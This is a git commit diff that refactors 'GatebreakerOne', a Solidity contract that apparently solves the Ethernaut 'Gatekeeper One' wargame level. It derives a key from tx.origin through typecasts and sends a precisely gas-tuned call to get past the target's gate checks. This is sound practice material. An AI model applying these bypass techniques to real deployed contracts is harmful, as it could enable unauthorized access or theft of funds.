39a3a70d520a9d36d603a4bf86ae09595e866e82
Mario Poneder <m.poneder@decentra.vision>
2022-02-01 22:27:54 +0100

    Refactored GatebreakerOne contract

--- solutions/GatebreakerOne.sol
+++ solutions/GatebreakerOne.sol
@@ -13,10 +13,8 @@ contract GatebreakerOne {
   // gateTwo: monitor gas usage in debugger
   // gateThree: learn what those typecasts do on a byte level
   constructor(address _gatekeeperContract) public {
-    GatekeeperOne gatekeeperContract = GatekeeperOne(_gatekeeperContract);
-
     bytes8 gateKey = bytes8(uint64(uint16(tx.origin))) /* pass part one and three */ | bytes1(uint8(1)) /* add highest byte to pass part two */;
-    (bool success, ) = _gatekeeperContract.call{gas: 8191*10 /* enough gas for function */ + 254 /* exact gas till gateTwo */}(abi.encodeWithSelector(gatekeeperContract.enter.selector, gateKey));
+    (bool success, ) = _gatekeeperContract.call{gas: 8191*10 /* enough gas for function */ + 254 /* exact gas till gateTwo */}(abi.encodeWithSelector(GatekeeperOne.enter.selector, gateKey));
     require(success);
   }
 }
